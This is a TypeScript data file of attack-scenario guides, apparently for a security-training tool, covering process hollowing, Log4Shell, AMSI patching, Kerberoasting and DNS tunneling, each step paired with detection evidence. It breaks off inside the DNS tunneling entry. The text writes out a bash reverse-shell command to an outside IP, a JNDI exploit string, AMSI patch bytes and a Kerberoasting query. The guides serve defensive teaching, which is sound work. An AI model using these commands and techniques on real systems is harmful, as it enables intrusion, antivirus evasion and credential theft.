import { RawScenarioStepGuideData } from '../scenario-step-guides';

export const CORE_AND_PALOALTO_STEP_GUIDES: Record<string, RawScenarioStepGuideData> = {
  'process-hollowing': {
    scenarioId: 'process-hollowing',
    briefing: {
      headline: 'Scenario Briefing: Process Hollowing (MITRE T1055.012) — Running Malware Inside a Trusted Windows Process',
      storyAnalogy:
        'Imagine an intruder who wants to enter a high-security bank without raising an alarm. Instead of breaking down the front door in a ski mask, they hire an official armored bank truck, freeze it inside the garage before the driver even starts the route, empty out all the legal bank cargo inside, load their own covert crew into the back of that exact armored truck, and release the brake. Every security camera and guard at the gate still sees the bank’s own trusted license plate and uniform.',
      plainSummary:
        'In this scenario (MITRE ATT&CK T1055.012), the attacker wants to run malicious code on a Windows workstation (10.20.4.18) without triggering antivirus or application-allowlisting rules. Instead of launching an unknown .exe file directly, the dropper (dropper.exe, PID 4812 — the initial stage-1 loader on disk) creates a genuine Windows system process—svchost.exe (PID 9104 — chosen because it carries a valid Microsoft digital signature that host firewalls and analysts trust)—in a paused state (CREATE_SUSPENDED = 0x00000004 — freezing the main thread before any code executes), hollows out its legitimate memory pages (NtUnmapViewOfSection — stripping the real Microsoft code from RAM), writes the malicious PE payload into that empty space (WriteProcessMemory), repoints the CPU registers to the new entry point (SetThreadContext on RCX), and resumes the thread (ResumeThread) so the malware runs disguised as svchost.exe.',
      diagramTopologySummary:
        'On the diagram: Start at Node ③ (Win11 Workstation 10.20.4.18 / dropper.exe PID 4812) and Node ④ (Hollowed svchost.exe PID 9104), follow the 5 memory-manipulation stages inside the host, and watch the final outbound C2 beacon travel through Node ② (Firewall) to Node ①/⑤ (Attacker C2 198.51.100.77:443) while Node ⑥ (SIEM) captures the forensic trail.',
      documentedAdvisory: 'MITRE ATT&CK T1055.012 · Sysmon v15 EventID 1 / 8 / 10 / 25 · Elastic Detection Rules',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1055.012',
        plainTitle: 'Launching a Legitimate Windows Process in a Paused ("Suspended") State',
        storyAnalogy:
          'Think of a stage director calling a famous, badge-carrying security guard onto the stage, but pressing the "Freeze" button the millisecond the guard steps through the door—before the guard can take a single step or read their official script.',
        simpleExplanation:
          'The attacker’s initial loader (dropper.exe, PID 4812 — the stage-1 file on disk that wants to hide its next move) calls CreateProcessW to start a real Windows system program: C:\\Windows\\System32\\svchost.exe (PID 9104 — chosen because svchost.exe has a valid Microsoft digital signature, so security tools and analysts naturally expect to see it running). However, the loader passes the creation flag CREATE_SUSPENDED = 0x00000004 (which tells the Windows kernel to build the process in RAM and create its main thread, but freeze it at the starting line before its first instruction can run — giving the attacker a quiet window to swap out its memory before behavior monitors trigger).',
        howItWorksInPractice:
          'When CreateProcessW is invoked with CREATE_SUSPENDED (0x00000004), the Windows kernel allocates the new process object (EPROCESS), maps ntdll.dll and the signed svchost.exe image into memory, and initializes the primary thread (TID 9108 — parked at ntdll!RtlUserThreadStart), while returning a full-access process handle (hProcess = 0x01C4 — granting the parent loader permission to read, unmap, and overwrite the child process’s virtual memory before execution begins).',
        diagramAlignment:
          'On the diagram, look at arrow #1.1→ from Node ③ (Win11 Workstation / dropper.exe PID 4812) to Node ④ (svchost.exe PID 9104), and return arrow ⇠#1.2 returning the valid process handle (hProcess = 0x01C4).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 1 (ProcessCreate): ParentImage C:\\Users\\Public\\dropper.exe spawning C:\\Windows\\System32\\svchost.exe instead of the standard Windows service controller (services.exe).',
      },
      {
        stepNumber: 2,
        mitreId: 'T1055.012',
        plainTitle: 'Hollowing Out ("Unmapping") the Original svchost.exe Code From Memory',
        storyAnalogy:
          'While the official armored truck is still frozen in the garage, the crew opens the back doors and removes every single crate of genuine bank cargo, leaving a completely hollow shell that still carries the official license plate on the outside.',
        simpleExplanation:
          'Now that svchost.exe (PID 9104 — still frozen in memory so it cannot defend itself) is waiting, dropper.exe inspects its Process Environment Block (PEB — Windows’ internal data table for the process, read at offset PEB+0x10 so the attacker can find the exact memory address where svchost.exe was loaded: ImageBaseAddress = 0x00007FF7A1200000). The loader then calls NtUnmapViewOfSection (an undocumented native API in ntdll.dll that strips the original Microsoft svchost.exe code completely out of RAM — hollowing out the process shell to make room for the malware at that exact same address).',
        howItWorksInPractice:
          'NtUnmapViewOfSection instructs the Windows Virtual Memory Manager to unmap the image section backed by C:\\Windows\\System32\\svchost.exe on disk (disconnecting the process’s virtual address space at 0x7FF7A1200000 from the legitimate Microsoft binary, while the outer process metadata and PID 9104 still look like a normal svchost.exe instance to basic task managers).',
        diagramAlignment:
          'On the diagram, follow arrow #2.1→ between Node ③ and Node ④ (NtUnmapViewOfSection @ 0x7FF7A1200000), and return arrow ⇠#2.2 confirming NTSTATUS 0x00000000 (STATUS_SUCCESS).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 10 (ProcessAccess) & EventID 25 (ProcessTampering): GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) on svchost.exe followed by image unmapping.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1055.012',
        plainTitle: 'Allocating Writable-Executable (RWX) Memory & Injecting the Malicious PE Image',
        storyAnalogy:
          'Into that emptied-out armored truck, the intruder loads their own hidden gear and rewrites the route manual inside the cab—keeping the exterior paint job untouched so nobody outside notices the swap.',
        simpleExplanation:
          'Into that hollowed-out address (0x00007FF7A1200000 — reusing the original base address so internal code pointers inside the malware do not break), dropper.exe calls VirtualAllocEx to reserve 224 KB (0x38000 bytes) of private memory with PAGE_EXECUTE_READWRITE = 0x40 permissions (allowing the memory region to be both written to right now and executed as CPU instructions a moment later). It then calls WriteProcessMemory (cross-process memory copy API) to write the malicious PE headers ("MZ" / 4D 5A — the executable file signature) and section bodies (.text, .rdata, .data) directly into svchost.exe’s RAM without ever saving the unpacked payload to the hard drive.',
        howItWorksInPractice:
          'A legitimate program loaded by the Windows kernel has strict per-section memory permissions (.text is Read-Execute 0x20, .data is Read-Write 0x04). Calling VirtualAllocEx with simultaneous Read-Write-Execute (PAGE_EXECUTE_READWRITE = 0x40 — chosen by loaders for speed so they can write and run in one step) and writing an "MZ" PE header into an unbacked private memory page is a primary forensic signal of process hollowing.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ shows Node ③ writing the 224 KB PE image into Node ④ (svchost.exe @ 0x7FF7A1200000), and return arrow ⇠#3.2 confirms BytesWritten = 0x38000.',
        detectionAndEvidence:
          'Documented in Windows Defender / ETW Threat-Intelligence (EtwTiLogAllocVMRemote) & Sysmon EventID 25: unbacked private RWX memory region containing a PE header (4D 5A 90 00).',
      },
      {
        stepNumber: 4,
        mitreId: 'T1055.012',
        plainTitle: 'Hijacking the CPU Thread Context & Resuming Execution',
        storyAnalogy:
          'Before pressing "Unfreeze", the intruder turns the driver’s steering wheel and GPS toward their own secret destination (0x7FF7A12014E0). The moment the freeze button is released, the truck drives straight toward the attacker’s objective.',
        simpleExplanation:
          'Even though the malicious code is now sitting inside svchost.exe, the frozen thread (TID 9108) is still pointing at the old Microsoft startup address. To redirect it, dropper.exe calls SetThreadContext to overwrite the thread’s RCX register with 0x00007FF7A12014E0 (on 64-bit Windows, a newly created suspended thread stores its upcoming program entry-point address inside RCX — so changing RCX re-aims the thread straight at the malware’s main() function). Finally, it calls ResumeThread (which decrements the thread’s suspend counter from 1 to 0, waking up svchost.exe so it immediately executes the injected malware).',
        howItWorksInPractice:
          'On x64 Windows, before a newly created thread runs its user-mode entry point (ntdll!RtlUserThreadStart), the target executable’s AddressOfEntryPoint is held in the RCX CPU register. Overwriting RCX via SetThreadContext (CONTEXT_INTEGER — modifying CPU general-purpose registers while the thread is suspended) redirects execution to the injected payload the instant ResumeThread releases the thread.',
        diagramAlignment:
          'On the diagram, arrow #4.1→ updates the thread context and resumes TID 9108 inside Node ④, with ⇠#4.2 returning SuspendCount = 1 → 0.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 8 / 25 (ProcessTampering — "Image is replaced"): the in-memory code executing at 0x7FF7A12014E0 no longer matches the signed svchost.exe binary on disk.',
      },
      {
        stepNumber: 5,
        mitreId: 'T1071.001',
        plainTitle: 'Outbound HTTPS Command-and-Control (C2) Beacon From the Hollowed Process',
        storyAnalogy:
          'The disguised armored truck now drives right past the perimeter gate guard (the firewall) to make a drop-off at an outside warehouse. The guard lets it pass because the truck’s badge says svchost.exe—until the central security room checks the GPS log and realizes that specific truck was never scheduled to leave the building.',
        simpleExplanation:
          'Now running inside the skin of C:\\Windows\\System32\\svchost.exe (PID 9104 — so basic endpoint firewall rules see a trusted Windows binary requesting network access), the payload opens an encrypted TLS 1.3 HTTPS connection over TCP port 443 (standard web traffic port chosen to blend in with normal employee browsing) to the external Command-and-Control server at 198.51.100.77 (cdn-telemetry-update.com — a lookalike domain used to receive remote operator commands).',
        howItWorksInPractice:
          'Application-based host firewalls often permit C:\\Windows\\System32\\svchost.exe to initiate outbound HTTPS connections. However, a legitimate svchost.exe is always spawned by services.exe and always includes a "-k <ServiceGroup>" command-line flag (such as "-k netsvcs" to host specific Windows services)—so a bare svchost.exe spawned by dropper.exe making external TLS connections is immediately caught by SIEM correlation.',
        diagramAlignment:
          'On the diagram, arrow #5.1→ travels from Node ④ (Hollowed svchost.exe) through Node ② (Firewall) to Node ①/⑤ (Attacker C2 198.51.100.77:443), while Node ⑥ (SIEM) correlates the alert.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 3 (NetworkConnect) & Suricata TLS JA3 72a589da586844d7f0818ce684948eea: svchost.exe (PID 9104) connecting to 198.51.100.77:443.',
      },
    ],
  },

  'log4shell-dfir': {
    scenarioId: 'log4shell-dfir',
    briefing: {
      headline: 'Scenario Briefing: Log4Shell (CVE-2021-44228) — From a Single HTTP Log Line to Remote Code Execution',
      storyAnalogy:
        'Imagine a building receptionist whose job is simply to write down every visitor’s name in a paper guestbook. One visitor walks up and says: "My name is ${Call-External-Courier-And-Run-His-Package}". Instead of writing that strange sentence down as plain ink on paper, the overly helpful receptionist actually picks up the phone, dials the outside courier, accepts a package from him, and executes its instructions inside the building.',
      plainSummary:
        'In this scenario (CISA Advisory AA21-356A / CVE-2021-44228), an attacker compromises a Java web server simply by sending a specially crafted text string—${jndi:ldap://198.51.100.44:1389/Exploit} (a dynamic lookup token that Log4j2 evaluates as an executable directory query rather than plain text)—inside an HTTP request header. When the Java application logs that header using vulnerable Apache Log4j2 (v2.14.1), Log4j’s message lookup feature reaches out to the attacker’s rogue LDAP server (port 1389), follows a referral to download a compiled Java class (Exploit.class — containing arbitrary bytecode), and executes an interactive shell (/bin/bash) inside the server.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Attacker / Rogue LDAP & HTTP Server 198.51.100.44), follow the HTTP request through Node ② (DMZ Reverse Proxy) into Node ③ (Java Web Server) and Node ④ (Vulnerable Log4j2 JVM Engine), and trace the outbound callback and shell to Node ⑤/⑥ (SIEM Detection).',
      documentedAdvisory: 'CISA Alert AA21-356A · NIST NVD CVE-2021-44228 · MITRE ATT&CK T1190 / T1059.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Sending the "${jndi:ldap://...}" String Inside an HTTP Header',
        storyAnalogy:
          'The intruder walks up to the front reception desk and hands over a visitor badge whose "Browser Name" field contains a secret phone-call instruction instead of a normal browser name.',
        simpleExplanation:
          'The attacker sends a standard HTTPS GET request to /api/v1/login on the public web server, but places a crafted Log4j lookup expression—${jndi:ldap://198.51.100.44:1389/Basic/Command/Base64/...} (a special "${prefix:name}" syntax that tells Log4j to dynamically fetch external data instead of printing literal text)—inside the HTTP User-Agent header (chosen because almost every web server automatically writes the User-Agent string into its access or diagnostic logs).',
        howItWorksInPractice:
          'Web applications routinely pass HTTP headers like User-Agent or X-Forwarded-For into logger.info() or logger.error() (for audit trails and debugging). Because Log4j2 v2.0–2.14.1 had message pattern lookups enabled by default (trying to be helpful by resolving variables like ${java:version} inside log lines), any untrusted header written to the log is parsed for "${...}" expressions.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ① (Attacker 198.51.100.44) through Node ② (Reverse Proxy) to Node ③ (Java Web Server :8080), and return arrow ⇠#1.2 as the request enters the Log4j logger.',
        detectionAndEvidence:
          'Documented in CISA AA21-356A & ModSecurity CRS Rule 944150: HTTP header or URI parameters containing "${jndi:" (or obfuscated variants like "${lower:j}ndi:").',
      },
      {
        stepNumber: 2,
        mitreId: 'T1190',
        plainTitle: 'Log4j Evaluates the Lookup & Connects Out to the Attacker’s Rogue LDAP Server',
        storyAnalogy:
          'As the receptionist writes the visitor’s name into the guestbook, they read the "${jndi:ldap://...}" instruction out loud, pick up the office telephone, and dial the intruder’s external directory number (port 1389) to ask what to do next.',
        simpleExplanation:
          'Instead of writing the string literally to the log file on disk, Log4j’s MessagePatternConverter hands the "${jndi:ldap://...}" expression to the Java Naming and Directory Interface (JNDI — Java’s built-in API for looking up shared enterprise objects over a network directory). JNDI immediately opens an outbound TCP connection on port 1389 to the attacker’s rogue LDAP server at 198.51.100.44 (forcing the internal web server to reach out to the attacker and ask how to construct the logged object).',
        howItWorksInPractice:
          'JNDI supports pluggable directory protocols including LDAP, RMI, and DNS (designed so enterprise Java apps could load centralized resources from a corporate directory). Because Log4j2 placed no domain whitelist on JNDI lookups, an attacker-supplied ldap:// URL forces the JVM (javax.naming.InitialContext.lookup) to dial out across the internet to an untrusted LDAP listener.',
        diagramAlignment:
          'On the diagram, follow arrow #2.1→ from Node ④ (Log4j2 JNDI Engine inside the Java Server) back out to Node ①/⑤ (Rogue LDAP Server 198.51.100.44:1389), and return arrow ⇠#2.2 delivering the LDAP Referral response.',
        detectionAndEvidence:
          'Documented in Zeek/Suricata SID 2034650: internal Java server initiating unexpected outbound LDAP (TCP/1389 or TCP/389) connections to an external IP address.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1105',
        plainTitle: 'LDAP Referral & Downloading Remote "Exploit.class" Bytecode Over HTTP',
        storyAnalogy:
          'The voice on the other end of the phone says: "I don’t keep the package here, go download the blueprint from my web locker on port 8888 (`javaCodeBase`)." The Java server obediently fetches that blueprint and loads it directly into memory.',
        simpleExplanation:
          'The attacker’s LDAP server replies with a JNDI Naming Reference containing javaCodeBase="http://185.220.101.42:8888/" and javaFactory="Exploit" (directory attributes that tell the Java server: "the object class you need is not stored here; go download its compiled code from this external HTTP URL"). Obeying those attributes, the JVM downloads Exploit.class (1.4 KB of compiled Java bytecode) over HTTP and loads it directly into memory using URLClassLoader (Java’s remote class-loading engine).',
        howItWorksInPractice:
          'When an LDAP SearchResultEntry includes javaClassName, javaCodeBase, and javaFactory, Java’s NamingManager.getObjectInstance() automatically spawns a URLClassLoader pointing to the remote javaCodeBase URL (allowing the attacker to inject a full compiled Java class over standard HTTP when direct LDAP deserialization is blocked).',
        diagramAlignment:
          'On the diagram, arrow #3.1→ fetches `GET /Exploit.class` from Node ① (Attacker HTTP Server `:8888`) into Node ④ (Java JVM Process `URLClassLoader`).',
        detectionAndEvidence:
          'Documented in Zeek `http.log` & Suricata: Java process downloading compiled `.class` bytecode (`CAFEBABE` magic header) from an external IP.',
      },
      {
        stepNumber: 4,
        mitreId: 'T1059.004',
        plainTitle: 'Executing the Static Initializer & Spawning a "/bin/bash" Reverse Shell',
        storyAnalogy:
          'The moment the blueprint finishes loading on the receptionist’s desk, a spring-loaded mechanism inside its cover (`static {}` block) snaps open and dials a permanent private backdoor phone line (`/bin/bash -i`) straight back to the intruder on port 4444.',
        simpleExplanation:
          'The instant the JVM initializes Exploit.class in memory, the class’s static {} initializer block (a special block of Java code that runs automatically the moment a class is loaded, before any method is even called) invokes Runtime.getRuntime().exec() (Java’s native OS command runner). This causes /usr/bin/java (PID 1842) to spawn /bin/bash -c "bash -i >& /dev/tcp/185.220.101.42/4444 0>&1" (PID 2910 — opening an interactive Linux shell and piping its input/output over TCP port 4444 straight back to the attacker).',
        howItWorksInPractice:
          'By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that arbitrary OS commands execute under the service account (tomcat) during Class.forName() initialization—even before Log4j finishes formatting the log line.',
        diagramAlignment:
          'On the diagram, arrow #4.1→ spawns `/bin/bash` (PID 2910) from Node ④ (Java JVM Process) and connects out to Node ① (`185.220.101.42:4444`), while Node ⑤/⑥ (SIEM / Auditd) captures the child shell process.',
        detectionAndEvidence:
          'Documented in Linux Auditd (`SYSCALL execve`) & Sysmon for Linux EventID 1: ParentProcess `/usr/bin/java` spawning child process `/bin/bash` or `/bin/sh` with `/dev/tcp/` redirection.',
      },
    ],
  },

  'amsi-reflective-dll': {
    scenarioId: 'amsi-reflective-dll',
    briefing: {
      headline: 'Scenario Briefing: In-Memory AMSI Patching & Reflective DLL Injection (MITRE T1562.001 / T1620)',
      storyAnalogy:
        'Imagine a burglar inside a jewelry store where every bag is inspected by an X-ray scanner at the counter (AMSI). Before pulling any tools out of their coat, the burglar reaches into the X-ray machine’s display wire inside their own room and solders a tiny jumper so the screen permanently flashes "BAG IS CLEAN". With the scanner blinded, they assemble their custom lockpick right in their hands without ever setting a tool down on the floor (the hard drive).',
      plainSummary:
        'Normally, when PowerShell runs a script or loads a .NET assembly, Windows Antimalware Scan Interface (AMSI — the built-in bridge that hands script buffers to the endpoint antivirus before execution) inspects the unencrypted code in memory. In this scenario (MITRE T1562.001 & T1620), the attacker first blinds AMSI inside their own PowerShell process (PID 6320) by overwriting the first 6 bytes of AmsiScanBuffer() in amsi.dll (so the scanner function immediately exits with an error code that PowerShell treats as "clean"). With AMSI silenced inside that process, PowerShell loads a C2 agent DLL directly from a byte array in RAM ([System.Reflection.Assembly]::Load — avoiding any file write to the C: drive).',
      diagramTopologySummary:
        'On the diagram: Start at Node ③ (Workstation 10.20.4.31 / powershell.exe PID 6320) and Node ④ (In-Memory amsi.dll & Reflective Loader), trace the 3 memory-patching and reflective-loading steps, and follow the final HTTPS beacon to Node ①/⑤ (C2 Server) monitored by Node ⑥ (EDR / SIEM).',
      documentedAdvisory: 'MITRE ATT&CK T1562.001 & T1620 · Microsoft Defender EtwTiLogProtectVM · Sysmon EventID 7 / 19',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1562.001',
        plainTitle: 'Locating amsi.dll in PowerShell’s Memory & Making AmsiScanBuffer Writable',
        storyAnalogy:
          'The intruder locates the exact inspection box (amsi.dll) mounted inside their room and unlocks its metal protective cover (changing memory protection from Read-Execute to Read-Write-Execute) so the internal wiring can be altered.',
        simpleExplanation:
          'Every PowerShell process automatically loads C:\\Windows\\System32\\amsi.dll (the Windows Antimalware Scan Interface library that inspects scripts before they run) into its own user-mode memory space. Because amsi.dll lives inside the exact same process room as the script, the attacker calls GetProcAddress to locate the AmsiScanBuffer function (the specific doorway function that scans every PowerShell command), and then calls VirtualProtect to change that 4 KB memory page from PAGE_EXECUTE_READ = 0x20 (which normally prevents anyone from altering the code) to PAGE_EXECUTE_READWRITE = 0x40 (unlocking the memory page so the script can overwrite AMSI’s own instructions).',
        howItWorksInPractice:
          'Because amsi.dll operates in user mode (Ring 3 — sharing the same virtual address space and permissions as powershell.exe PID 6320 rather than being isolated in the Windows kernel), any code running inside PowerShell can call Win32 VirtualProtect via P/Invoke to make amsi.dll’s .text code page writable.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ shows Node ③ (powershell.exe PID 6320) invoking VirtualProtect on Node ④ (amsi.dll!AmsiScanBuffer), and return arrow ⇠#1.2 returns OldProtect = 0x20 (PAGE_EXECUTE_READ).',
        detectionAndEvidence:
          'Documented in Microsoft-Windows-Threat-Intelligence ETW (EtwTiLogProtectVM) & PowerShell EventID 4104: VirtualProtect changing code pages of amsi.dll to PAGE_EXECUTE_READWRITE.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1562.001',
        plainTitle: 'Overwriting 6 Bytes of AmsiScanBuffer So Every Scan Immediately Returns "Clean"',
        storyAnalogy:
          'With the inspection cover open, the intruder replaces the scanner’s sensor circuit with a 6-byte shortcut that immediately stamps "E_INVALIDARG / CLEAN" and exits before the camera even turns on.',
        simpleExplanation:
          'With the memory page unlocked, the script writes a 6-byte x64 machine-code stub—B8 57 00 07 80 C3 (which translates to the CPU instructions "mov eax, 0x80070057; ret" — telling the CPU to immediately return error code E_INVALIDARG and exit the function)—directly over the beginning of AmsiScanBuffer(). From this instant on, whenever PowerShell hands a malicious script to AMSI for inspection, AmsiScanBuffer returns immediately at byte 0 before scanning a single character (and PowerShell treats that error return as "no malware found" and runs the script).',
        howItWorksInPractice:
          'AmsiScanBuffer normally validates its arguments and passes the script buffer to the registered antivirus provider. By overwriting its prologue with mov eax, 0x80070057; ret (forcing an immediate E_INVALIDARG return without setting AMSI_RESULT_DETECTED), the attacker blinds AMSI for the remainder of PID 6320’s lifetime.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ writes the 6-byte patch into Node ④ (amsi.dll!AmsiScanBuffer +0x00), and return arrow ⇠#2.2 returns 0x80070057 (AMSI_RESULT_CLEAN bypass).',
        detectionAndEvidence:
          'Documented by Defender ATP / Elastic Endgame memory integrity scans: the in-memory prologue of amsi.dll!AmsiScanBuffer differs from the clean amsi.dll image on disk.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1620',
        plainTitle: 'Reflectively Loading a .NET / PE Agent Directly From a Byte Array in RAM',
        storyAnalogy:
          'Now that the room’s X-ray scanner is blind, the intruder unfolds a complete communication radio directly out of a memorized blueprint in their head (`[Reflection.Assembly]::Load`), never placing a single file onto the floor where a floor sensor could spot it.',
        simpleExplanation:
          'Now that AMSI is blinded inside PID 6320 (why this works: normally, calling Assembly::Load triggers an automatic AMSI memory scan in .NET 4.8+, which would have caught the unencrypted DLL if Step 2 had not patched AmsiScanBuffer first), the attacker decodes a Base64 payload in RAM and calls [System.Reflection.Assembly]::Load([byte[]]$buf) (a built-in .NET reflection API that loads a compiled DLL directly from a memory array — allowing the C2 implant to run without ever writing a .dll file to the C: drive where disk-based antivirus could quarantine it).',
        howItWorksInPractice:
          'Reflective loading parses the PE/COFF headers and maps the compiled .NET assembly directly into the process’s Common Language Runtime (CLR) application domain in volatile RAM (leaving ModuleILPath blank on disk, though still visible to .NET Runtime ETW providers that inspect unbacked in-memory assemblies).',
        diagramAlignment:
          'On the diagram, arrow #3.1→ loads the reflective DLL inside Node ④ and opens the C2 channel toward Node ①/⑤, while Node ⑥ (SIEM / DotNet Runtime ETW) logs the unbacked assembly load.',
        detectionAndEvidence:
          'Documented in Microsoft-Windows-DotNETRuntime ETW (AssemblyLoadVerbose_V1) & Sysmon EventID 7: CLR assembly loaded from memory with an empty ModuleILPath (no backing file on disk).',
      },
    ],
  },

  'ad-kerberoasting': {
    scenarioId: 'ad-kerberoasting',
    briefing: {
      headline: 'Scenario Briefing: Active Directory Kerberoasting (MITRE T1558.003) — Requesting Service Tickets to Crack Offline',
      storyAnalogy:
        'Imagine a theme park where any visitor with a basic entry wristband is allowed to walk up to the ticket booth and ask for a sealed VIP voucher to the SQL Rollercoaster. The booth seals that voucher using the rollercoaster manager’s secret password. Instead of riding the coaster, the attacker takes the sealed voucher home to their basement and tries millions of passwords per second until the seal pops open—without a single guard at the park knowing they are guessing.',
      plainSummary:
        'In Windows Active Directory, any standard domain user is allowed to ask the Domain Controller (KDC) for a Kerberos Service Ticket (TGS) to connect to any service registered with a Service Principal Name (SPN — the directory directory tag that links a network service like SQL Server to the service account that runs it). Because the Domain Controller encrypts that ticket using the password hash of the target service account (svc_sqladmin), an attacker (MITRE T1558.003) can request the ticket legitimately with downgraded RC4 encryption (etype 0x17 — chosen because it cracks thousands of times faster than AES), export it from memory, and brute-force the password offline on a GPU rig (generating zero failed-login alerts on the Domain Controller).',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/③ (Compromised Domain Workstation 10.20.4.55), query SPNs and request a RC4 TGS ticket from Node ④ (Active Directory KDC / DC01 10.20.1.10:88), crack the hash offline, and authenticate as the privileged SQLAdmin account to Node ⑤ (SQL Server), monitored by Node ⑥ (SIEM EventID 4769).',
      documentedAdvisory: 'MITRE ATT&CK T1558.003 · Microsoft Security EventID 4769 · CISA / NSA Active Directory Hardening Guide',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1558.003',
        plainTitle: 'Querying Active Directory LDAP to Find Accounts With Service Principal Names (SPNs)',
        storyAnalogy:
          'The visitor opens the park’s public phonebook (LDAP) and searches for every attraction that uses a human manager’s personal account instead of an automated machine lock.',
        simpleExplanation:
          'From a domain-joined workstation (10.20.4.55) using a regular low-privilege employee account, the attacker sends an LDAP query to the Domain Controller (DC01, TCP port 389 — the standard Active Directory directory-lookup port that every domain user is allowed to read by default). The query filters for samAccountType=805306368 (which restricts results to human/service user accounts rather than automated computer accounts whose 120-character random passwords cannot be cracked) paired with servicePrincipalName=* (finding accounts tied to a network service)—discovering MSSQLSvc/sql01.corp.local:1433 owned by the privileged account svc_sqladmin.',
        howItWorksInPractice:
          'Every authenticated domain user has read permission on Active Directory LDAP so workstations can locate printers, shares, and databases. Human-created service accounts like svc_sqladmin are prime Kerberoasting targets because admins often set a human-memorable password once during installation and rarely rotate it.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ③ (Domain Workstation) to Node ④ (Active Directory DC01 :389 LDAP), and return arrow ⇠#1.2 returning the SPN record `MSSQLSvc/sql01.corp.local:1433`.',
        detectionAndEvidence:
          'Documented in Microsoft Defender for Identity & LDAP ETW: LDAP search filter `(&(samAccountType=805306368)(servicePrincipalName=*))` enumerating all user-bound SPNs.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1558.003',
        plainTitle: 'Requesting a Kerberos Service Ticket (KRB_TGS_REQ) With Downgraded RC4 Encryption',
        storyAnalogy:
          'The visitor walks up to the central ticket booth (KDC port 88) and requests a voucher for the SQL attraction, specifically asking the clerk to seal it with an older, faster-to-crack wax stamp (`0x17 RC4-HMAC`) instead of modern armor (`AES-256`).',
        simpleExplanation:
          'Using their valid login session (TGT), the attacker sends a Kerberos Service Ticket request (KRB_TGS_REQ — a standard ticket request that triggers zero account-lockout counters because asking for a service ticket is normal domain behavior) to the Domain Controller’s Key Distribution Center (KDC, port 88) for MSSQLSvc/sql01.corp.local:1433. Crucially, the attacker specifies encryption type 0x17 (RC4-HMAC — a legacy cipher that encrypts the ticket directly with the service account’s raw NTLM password hash without slow PBKDF2 iterations, making it thousands of times faster to brute-force offline than modern AES-256 / 0x12).',
        howItWorksInPractice:
          'By design in the Kerberos protocol, the KDC does not check whether the requesting user actually has permission to log into the SQL database (leaving that authorization check to the SQL Server itself when the ticket is presented). Instead, the KDC immediately encrypts the KRB_TGS_REP service ticket using the NTLM hash of svc_sqladmin and hands the ciphertext back to the attacker.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ sends `KRB_TGS_REQ (SPN: MSSQLSvc/sql01.corp.local:1433, etype=0x17)` to Node ④ (KDC :88), and ⇠#2.2 returns the RC4-encrypted `KRB_TGS_REP` ticket.',
        detectionAndEvidence:
          'Documented in Windows Security EventID 4769 (A Kerberos service ticket was requested): `TicketEncryptionType = 0x17` (RC4-HMAC) and `TicketOptions = 0x40810000` when modern domain machines normally use `0x12` (AES256).',
      },
      {
        stepNumber: 3,
        mitreId: 'T1110.002',
        plainTitle: 'Cracking the Service Ticket Offline & Logging In With the Recovered Password',
        storyAnalogy:
          'Back in their private workshop, the attacker tests millions of candidate passwords per second against the sealed voucher (`$krb5tgs$23$*`) until the seal opens—revealing the SQL manager’s real plaintext password without ever triggering a single failed-login alarm at the park.',
        simpleExplanation:
          'The attacker exports the KRB_TGS_REP ticket from memory in $krb5tgs$23$* format (the standard Kerberos RC4 cipher format understood by password crackers) and runs Hashcat (-m 13100 — Kerberos 5 TGS-REP etype 23 mode) on an offline GPU rig (why offline matters: because every password guess is tested against the downloaded ticket file on the attacker’s own machine, zero failed-login events or account lockouts ever occur on the Domain Controller). Once the plaintext password of svc_sqladmin is cracked, the attacker logs directly into the production SQL Server (Node ⑤).',
        howItWorksInPractice:
          'Because RC4-HMAC (etype 23) keys the cipher directly with the unsalted MD4/NTLM hash of the service account’s password and includes a known decrypted structure inside the ticket timestamp, a modern GPU can test billions of candidate passwords per second until the ticket checksum validates.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ shows the attacker cracking the ticket offline and authenticating with `svc_sqladmin` to Node ⑤ (SQL Server :1433) while Node ⑥ (SIEM) correlates EventID 4769 with the subsequent privileged login (EventID 4624).',
        detectionAndEvidence:
          'Documented in Windows Security EventID 4769 followed by EventID 4624 (Logon Type 3) for `svc_sqladmin` from an unusual workstation IP.',
      },
    ],
  },

  'dns-tunneling-exfil': {
    scenarioId: 'dns-tunneling-exfil',
    briefing: {
      headline: 'Scenario Briefing: DNS Tunneling & Data Exfiltration (MITRE T1071.004 / T1048.003)',
      storyAnalogy:
        'Imagine a locked-down prison facility where inmates are forbidden from mailing letters or making outside phone calls, but they are allowed to ask the prison operator: "What is the phone number for [Company Name]?" The operator is required to call the outside directory to check. So the inmate asks: "What is the phone number for `Secret-Blueprint-Page1-4a6f686e.evil-c2.net`?" The prison operator faithfully reads that exact secret message out loud to the accomplice waiting at the `evil-c2.net` directory desk.',
      plainSummary:
        'Even in tightly locked-down networks where employees cannot browse external websites directly, internal computers still need to resolve domain names (DNS) through an internal corporate DNS resolver. In this scenario (MITRE T1071.004 & T1048.003), the attacker abuses that DNS chain: instead of connecting directly to their server (which the firewall would block), the malware on the victim workstation chops stolen database records into small Base32/Hex chunks (so the binary bytes contain only legal hostname characters), disguises each chunk as a subdomain label (<chunk>.exfil.c2-auth-dns.net), and asks the corporate DNS server (10.20.1.53) to look it up—forcing the corporate DNS server itself to carry the stolen data across the firewall to the attacker’s authoritative nameserver.',
